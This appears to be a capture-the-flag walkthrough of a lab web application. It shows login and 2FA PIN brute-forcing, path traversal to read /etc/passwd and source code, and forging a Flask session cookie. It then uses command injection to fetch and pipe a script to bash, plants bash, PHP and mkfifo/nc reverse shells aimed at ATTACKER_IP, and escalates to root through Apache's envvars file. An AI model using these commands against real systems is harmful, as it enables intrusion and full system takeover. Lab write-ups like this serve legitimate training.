The web application development company SecureSolaCoders has created their own intranet page. The developers are still very young and inexperienced, but they ensured their boss (Magnus) that the web application was secured appropriately. The developers said, "Don't worry, Magnus. We have learnt from our previous mistakes. It won't happen again". However, Magnus was not convinced, as they had introduced many strange vulnerabilities in their customers' applications earlier.

Magnus hired you as a third-party to conduct a penetration test of their web application. Can you successfully exploit the app and achieve root access?

Start the VM by pressing the green "Start Machine" button. Please allow the machine 3 - 5 minutes to fully boot.

# Enumeration

## \[+] 10.10.36.107 - intranet.thm

Using `echo` and `>>` to append the IP address with the domain name to my `/etc/hosts` file. Then `export` the IP address to the environment variable `RHOSTS` so I can use `$RHOSTS` instead of typing the IP address every time.

First I run a quick scan with [rustscan](https://github.com/RustScan/RustScan) and a longer [nmap](https://nmap.org/) stealth scan with `-Pn` mode enabled which will treat all hosts as online:

```sh
echo '10.10.36.107 intranet.thm' >> /etc/hosts
export RHOSTS=10.10.36.107
rustscan -a $RHOSTS --ulimit 5000 -b 4500 -t 2000 --range 1-65535 -- -sC -sV
sudo nmap -v -Pn -sS -p- -A --min-rate=1000 -T4 $RHOSTS -oN nmap.txt
```

## \[+] Port 8080 - HTTP

### \[-] intranet.thm:8080/login

Here we have a login portal to the web application:

![56950e28b21db4cbe161dac1e4d20e27.png](/resources/17219fe7158643f18a6cd6e915907ce3.png)

There is no rate limiting for multiple failed attempts so we can try to brute force the login credentials. First we need to gather information to increase our chances of finding a valid e-mail account.

From the briefing, we have a name "magnus" and in the source code we have "anders" and "devops":

![52ed8ae027bad9bcff2f441fb7642cba.png](/resources/56125171d907491bb8753d0e20f8dfcf.png)

Then we create a list with these names and the e-mail domain @securesolacoders.no:

```
magnus@securesolacoders.no
anders@securesolacoders.no
devops@securesolacoders.no
```

For the password we can try words like "securesolacoders", "devops", "anders", etc. as the base word and then prepend or append other strings or subsitute the letters for numbers - common variations that you would see in a password list.

To create this password list I used the [Weakpass](https://weakpass.com/generate) wordlist generator. Enter the base words in the "Words" text area, click generate, the copy the results to the clipboard, paste it into a new text file and save it.

![ce4ea8ba8b1e4c77b546fec341d2341d.png](/resources/1dba0503db6b45d8914ba9c59bd28411.png)

To brute force the login we can use [Hydra](https://github.com/vanhauser-thc/thc-hydra) or [ZAP](https://www.zaproxy.org/), I used ZAP.

In ZAP, we enter the URL `http://intranet.thm:8080` under the "Quick Start" tab, select "Manual Explore" and click "Launch Browser":

![ad6420463ece4cac0549ff88330961e8.png](/resources/35d88879e743449ba0f852a0e78bfd02.png)

![7d19b3dc829e46883b9d45b620941549.png](/resources/af33c06eaf224300ab9d7a9fb77a4cc3.png)

Next we enter any login credentials like "<test@test.com>" with the password "test" and intentionally fail the login process so we can modify the request in ZAP:

![c51e6538495719ea6f6b9d99797225a7.png](/resources/07987b1e5f214156a106b1a8bd76ca73.png)

Back in ZAP we check the "Sites" tab under `http://intranet.thm:8080` > "POST:login()(pasword,username)" for the POST request:

![2fa70aa49db52363106f3a5159bb4a8d.png](/resources/e43fbcfd19574eaca191965992bdac8b.png)

To send the request to the fuzzer we highlight `test%40test.com`, right-click and select "Fuzz...":

![ab5ee142fba7a3718ed1fa8142c55309.png](/resources/8564863a02ab4bbab634ea23ccfe54a1.png)

Since we highlighted `test%40test.com` before opening the fuzzer, it automatically sets up the email parameter for us. Next we click on "Payloads..." then "Add..." which will open the "Add Payload" window where we select "Strings" from the "Type" dropdown menu, add the e-mails we want to try to brute force in the "Contents" text area and click "Add":

![cf6a095ec2bec8169e42422a5d2b225f.png](/resources/7862752ef39a47098358774f98304948.png)

In the "Payloads" window, click "OK" to return to the Fuzzer then highlight `test` under the `password` parameter and click "Add...":

![29147ce0adc43a94b6fd84697108006e.png](/resources/fa42ba4fad8a4f93871c7b57e2371ee6.png)

This will open the "Payloads" window and we select "Add..." to open the "Add Payload" window where we select "File" from the "Type" dropdown menu, click "Select" and browse to the wordlist we generated earlier, check the "Payloads Preview" text area to make sure we have the right file and click "Add":

![1f47c7b65eaa858829d0cd2c7d6e926a.png](/resources/d24593747bb546b5ac4be0ae91207757.png)

In the "Payloads" window, click "OK" to return to the Fuzzer then click "Start Fuzzer":

![6dcb97a571705fcfee4aab9027121e48.png](/resources/b8798e22958f41bda569b038031dadea.png)

After running the fuzzer for a while, we find the correct credentials by sorting the "Size Resp. Body". The failed logins have a size around 2,253 bytes while the successful login has the size of 195 bytes:

![96abb17051122c6630d0727207432404.png](/resources/edacc96a0be64d7185030241120a3b55.png)

### \[-] intranet.thm:8080/sms

After logging in we get the first flag and a Two-Factor Authentication form that requires a 4-digit PIN:

![d0da9fcf9fc6d9cbcd44a2ce148e9d18.png](/resources/6fd9e5a8ac854827a3a894182ae130d1.png)

This form does not have rate limiting so we can brute force the pin like the login portal. We try a value of `0000`, click "Submit" then check the request in ZAP under the "Sites" tab > `http://intranet.thm:8080` > POST:sms()(sms):

![4b7dc7f9efa3435c1a81df181c76e46d.png](/resources/29c8c09023d448f8aba0a766c0618854.png)

Next we highlight the value `0000`, right-click and select "Fuzz...":

![1b6edefdbd061c68e792590759035da5.png](/resources/e2cd73f2764e4043b3ed2c93b59e51f6.png)

We need a list of numbers from `0000` to `9999`. In the terminal we can use `seq` with the `-w` switch to pad the numbers with `0` up to `9999` then output the results to a file `pin.txt`:

```
$ seq -w 0 9999 > pin.txt
```

Then we add it to our fuzzer like we did with the wordlist:

![15e0ff25cc1837a75520bd052d297852.png](/resources/e84c337403d647ac95d5d1521d4cb6f4.png)

Confirm our options then start fuzzing until we get a successful match which will have the "Size Resp. Body" of 197 bytes:

![121163731f5347efb006fd388ca10f12.png](/resources/53c7a1916c66426fa8aa87850c3d6104.png)

### \[-] intranet.thm:8080/home

After entering the correct PIN we get the next flag and now have access to the dashboard:

![319301f7dd4e178c70368c7997235c7b.png](/resources/0e2054298a274a129d712df0ef8be4fd.png)

### \[-] intranet.thm:8080/internal

This page has an "Update" button which is supposed to add new updates under "Update news feed":

![f4e6764f2b8ed9c34e530f798e1e533f.png](/resources/a0896f6b7acd468e91b523b3d6862a8e.png)

We can check the request it's making by clicking the "Update" button and switch back to ZAP under the "Sites" tab > `intranet.thm:8080` > POST:internal()(news):

![8fc977cf0d8c751af238071b70e0c132.png](/resources/f23c27c4113d46c5bd5b9ab36a0de499.png)

This button's function is grabbing the contents from a text file and reflects the contents in the "Update news feed" section. We can see if this function is vulnerable to [Local File Inclusion](https://en.wikipedia.org/wiki/File_inclusion_vulnerability) and try to get the contents from other files in the system.

In ZAP, we right-click on the request and select "Manual Request Editor" so we can edit the request:

![1d69c9fca7e49a044bafc526c12bc69a.png](/resources/f123b117ad034621a415d120199f6761.png)

We can try to read the "passwd" file by changing the value from `latest` to `../../etc/passwd`. Every time we prepend the value with `../` will move us up a directory. In this case, we have to move up twice to get to the root directory then we are able to navigate to `/etc/passwd`:

![f57a538372decbf1825940816b4ccfcd.png](/resources/dbdeb9945cd645fa884d953e82f7a28c.png)

After clicking the "Send" button, under the "Response" tab, we scroll down to find the contents of the "passwd" file for this machine which means we have successfully exploited an LFI vulnerability:

![6844d9c1dae38e81d92da48277b97c52.png](/resources/1f7d2aacaa094099a5f169df32f4f4bf.png)

We can leak the source code for the web application, but first we need to find it's location. To do this we can look at the "cmdline" file which provides information about the command line arguments passed to the currently running process.

Going back to the "Request" tab we change the value of the `news` parameter to `../../proc/self/cmdline` and click "Send":

![118825e2b7d45b29b7d83b4c0e23f036.png](/resources/d556cfb518f544e99590544e5cc9dc77.png)

Under the "Reponse" tab, we scroll down to find the location of the source code:

![3738bbd0d28052e23ea8cf73c73b0f85.png](/resources/c0bd7871fe7841ffbdd8ef04ad45032c.png)

We can exclude `/usr/bin/python3` since that's the binary that is running the code. So our next request should be `../../home/devops/app.py`:

![a835b23f391a9ed11a4f1293f982cb54.png](/resources/fc652ee5d5264118966bdac1fb206f69.png)

In the source code, we get the next flag but it also has some [HTML Entities](https://www.w3schools.com/html/html_entities.asp) like `&#34;`:

![2f36b5b0294ac140f37c6147b6804468.png](/resources/bde6dcd62c3747a9876594bfad67e335.png)

We can copy and paste the source code into [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_HTML_Entity\(\)) and select "From HTML Entity" and get the cleaned up code from the output:

![a782a36edbda9380283c489df16e9ceb.png](/resources/da550d97cba8428c99f27fec0936d0d6.png)

### \[-] intranet.thm:8080/admin

If we try to access the admin page we get the error "Forbidden, You don't have the permission to access the requested resource. It is either read-protected or not readable by the server.":

![926a9ade902622468854c40b419ba053.png](/resources/a94fe8f617074e1abc2326fee4e0fc6a.png)

Which means the account we are using doesn't have administrator permissions. Checking the headers of our requests we are assigned a [JSON Web Token](https://en.wikipedia.org/wiki/JSON_Web_Token) session cookie when we logged in:

![6b8c85f1e3e98e705b1c6c38c28d6936.png](/resources/f2d8a785f0854eb893e9c6f7649b197f.png)

Using a website like JWT.io we can decode the cookie to see it's values:

![ec185339fcaa781b116e1cdcffa8e198.png](/resources/a469f034c4c94e088b016becda122d2a.png)

We can try to modify the values, but not without the signing key.

If we check the source code we can see how it's generating the signing key:

![cd2a008fa2076d18c743cf1bf8e080b2.png](/resources/e66a7ef4f2e94a0d858795f6ef032424.png)

The key is `secret_key_` plus a random value from `100000` to `999999`. We can brute force this key by using a tool called [Flask Unsign](https://github.com/Paradoxis/Flask-Unsign) by Paradoxis.

First we generate a number list using `seq` again:

```
$ seq 100000 999999 > numbers.txt
```

Then we use `flask-unsign` with the flags `-u` to crack the key, `-w` to specify our number list and `-c` to specify our cookie:

```
$ flask-unsign -u -w numbers.txt -c 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYW5kZXJzIn0.ZS-QwA.XHhtnXC-cb2iY4Puel5agPiva_U'
```

After a while we should have the key needed to sign our own JWT session cookie:

![7e33f6fe0aa09658276916944065e0bf.png](/resources/8bb9f7bbfb3540dabdc1eab047687c65.png)

Now we can create our session cookie using the decoded information from JWT.io. Using `flask-unsign` we use the flags `-s` for signing, `-c` to specify the cookie information and `--secret` with the secret key we cracked to sign the cookie:

```
$ flask-unsign -s -c "{'logged_in': True, 'username': 'admin'}" --secret 'secret_key_243495'
```

After pressing enter, we will get our new JWT session cookie, in my case it's `eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4ifQ.ZS-pCw.ihpN01JJootftsSH7xpm_HPNNi0`.

In the browser in which the website is open, we can change our current JWT session cookie to this new JWT session cookie by accessing the developer's tools by pressing F12 (in FireFox). Under the "Storage" tab > Cookies > `http://intranet.thm:8080` we can change the `session` value by double-clicking on it and replace it with our new session cookie then press Enter to confirm the changes:

![369c9ed34ff0e8bae3aa7e121ed99967.png](/resources/1cf10f3aa14e417db303b93e317b452a.png)

Now, we should be able to access the admin page and get the next flag:

![3f13485d5e796576b0b2b0f1a440fd86.png](/resources/ac53576fd26c40909d6ea0efdab7ee38.png)

# Initial Foothold

### \[-] devops\@workshop

Checking the source code, "app.py" for the admin page, we will find a hidden debug function that can be accessed using POST requests to the admin page:

![8eae6ceac4cbb2d4e510a890baf07485.png](/resources/33eef8e692744f62bbfcae516dfad7d0.png)

To see if this is working, we can try making a request from the victim machine using [curl](https://linux.die.net/man/1/curl) to our attacker machine running a simple Python HTTP server.

On our attacker machine we start the HTTP server on port 8888 using `python3`:

```
$ python3 -m http.server 8888
```

In a new terminal, we use `curl` to access `http://intranet.thm:8080/admin` with the flags `-X POST` to make our request a POST request, `-H 'Cookie: session=<JWT_SESSION_COOKIE>'` to add the Cookie header and the JWT session cookie that we generated, and `-d 'debug=curl <ATTACKER_IP>'` to make the victim machine send a request to the attacker machine HTTP server using `curl`

```
$ curl 'http://intranet.thm:8080/admin' -X POST -H 'Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4ifQ.ZS-v5g.1iHgx7AEkXQwbJt-4WWQKAt_CqE' -d 'debug=curl <ATTACKER_IP>:8888'
```

When we check the terminal running the Python HTTP server on the attacker machine, we should see a GET request from the victim machine:

![73755c74887d24739bf8b0025f63598a.png](/resources/e5bfaf0fe2914e51a0b6da26b054bfe2.png)

To get a reverse shell, we can make the victim machine download a bash script from our server and pipe it to bash to run the script.

First we create the script and name it "shell.sh":

```
$ echo 'bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1"' > shell.sh
```

Host the script using a Python HTTP server:

```
$ python3 -m http.server 8888
```

Start a listener using [nc](https://linux.die.net/man/1/nc) on port 4444:

```
$ nc -nvlp 4444
```

Then make a `curl` request to the victim machine with the `debug` value set to `curl` the script from our server and pipe `|` to `bash`:

```
$ curl 'http://intranet.thm:8080/admin' -X POST -H 'Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4ifQ.ZS-v5g.1iHgx7AEkXQwbJt-4WWQKAt_CqE' -d 'debug=curl <ATTACKER_IP>:8888/shell.sh | bash'
```

After pressing enter the request should hang and we check the terminal listening on port 4444 for the connection from the victim machine:

![39d7fd19619bec256b712ea079a0a579.png](/resources/42f15763934b4dbeb4e80eeece119602.png)

We can find the user flag in `/home/devops/user.txt`:

```
$ ls -lah
$ cat user.txt
```

![86bdfb8515c8e8a30fec146e09efe875.png](/resources/bf0672c92fef4fcfb43a78c70c8fa596.png)

### \[-] anders\@workshop

We can check the currently running processes of the machine using [ps](https://linux.die.net/man/1/ps) and the options `aux` will print all processes with the PID and command used. Since we only want the processes ran by the user "anders", we pipe `|` the results to [grep](https://linux.die.net/man/1/grep) for `anders`:

```
$ ps aux | grep anders
```

![50146ebb71fcd0f956f2a14199586285.png](/resources/65d1f20bebdc44849a4f7df685d1e3c1.png)

We find that the user "anders" is running `apache2` which is a webserver powered by [Apache](https://www.apache.org/). The hosted web pages are usually located in `/var/www/html` so let's check that directory:

![c2a062d5066e1bed5667567cefba589b.png](/resources/18c9932ccd664e89ab461923fa66b049.png)

Using `cat` to print the contents of "index.html":

![c6e1444e3971a367673e8cb77cc0e872.png](/resources/1612f5bfafbd41f59b8b346ec277014c.png)

We can check the website on port 80 to see if this page is accessible, `http://intranet.thm`.

## \[+] Port 80 - HTTP

### \[-] intranet.thm

Here we find the page that is hosted by the user "anders":

![e2e60ef57d3ad0d3e9b400b6d8ed9ba4.png](/resources/17b161b727d54739b04402443f22382a.png)

We can upload a PHP reverse shell script and access it on port 80 to get a reverse shell as the user "anders".

First we should check if the directory `/html` is writeable using `ls -lah`:

```
$ ls -lah /var/www/
```

![a6274bae35ab0bb9d1c727c8392ee9a9.png](/resources/c2bbb14318ee4557a08c61562dff2bc7.png)

The `/html` directory has the full permissions of `drwxrwxrwx` so we are able to get our PHP reverse shell script in here.

We can generate a PHP reverse shell script using [revshells.com](https://www.revshells.com/). Enter the attacker machine's IP and port 4445 then click the disk icon to save it as "shell.php":

![84d9e280e0c5e77046e161805160bf2c.png](/resources/e0058acd90b44814903434d6fc3373c7.png)

On the attacker machine, host it using Python HTTP server:

```
$ python3 -m http.server 8888
```

On the victim machine, change directory to `/var/www/html` then use [wget](https://linux.die.net/man/1/wget) to download "shell.php" from the attacker machine:

```
$ cd /var/www/html
$ wget <ATTACKER_IP>:8888/shell.php
```

On the attacker machine, start another listener on port 4445:

```
$ nc -nvlp 4445
```

Then access the reverse shell by visiting `http://intranet.thm/shell.php`. The page will hang and when we check our listener we should have a connection from the victim machine as the user "anders":

![1b83f2ea5c83af778653ea502b1b0834.png](/resources/38d5c9dc67f749ce81c07d569b409c3c.png)

We can get the user2 flag in `/home/anders/user.txt`

![1051600f276295c0ec7cfb94d6edf3af.png](/resources/ffd1fbb1f4dd4abc9767da70d1188d9e.png)

### \[-] root\@workshop

First let's replace `/home/anders/.ssh/authorized_keys` file with our own SSH key, so we can get a better shell. Change directory to `/home/anders/.ssh`, then run `ssh-keygen` to generate the keys, we will keep the default name "id\_rsa" enter a password if you wish:

```
$ cd /home/anders/.ssh
$ ssh-keygen
```

Rename `id_rsa.pub` to `authorized_keys`. Normally we would back up the original file, but in this case the file size is 0 bytes:

```
$ mv id_rsa.pub authorized_keys
```

Use `cat` on the private key and save it to a text file on the attacker machine:

```
$ cat id_rsa
```

On the attacker machine, use `chmod` to give the SSH key file proper permissions before connecting with `ssh` and `-i` flag will allow us to specify the SSH key file:

```
$ chmod 600 id_rsa
$ ssh -i id_rsa anders@$RHOST
```

We can check if the user "anders" can run any commands with [sudo](https://linux.die.net/man/8/sudo) using `sudo -l`:

```
$ sudo -l
```

We are able to restart the `apache2` service with `sudo`. If we can get the service to run a reverse shell command, we will have a connection back to our attacker machine as `root`.

Let's try to find any writable files using `find` with the option `-type` set to `f` to search for files only and `-writable` to list only files we can write to:

```
$ find / -type f -writable 2>/dev/null
```

The "envvars" file is used to set environment variables that can be used by Apache's configuration files and scripts. It is typically found in the Apache configuration directory, often located at `/etc/apache2`.

The `apache2` service will run any commands in the "envvars" file when the service is started, so we can write a reverse shell command to have it connect to the attacker machine.

We can edit the "envvars" file using `vim`:

```
$ vim /etc/apache2/envvars
```

Press `i` to edit the file, then add our reverse shell command:

```
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f`
```

After we are finished editing the file, press the `esc` key and type `:wq` to write and quit VIM.

On the attacker machine we start a listener on port 4444:

```
$ nc -nvlp 4444
```

On the victim machine as the user "anders" we restart the `apache2` service using `sudo`:

```
$ sudo /sbin/service apache2 restart
```

Back on the attacker machine listening on port 4444, we should get a connection from the victim machine. This time when we check our `id` we will be the user "root":
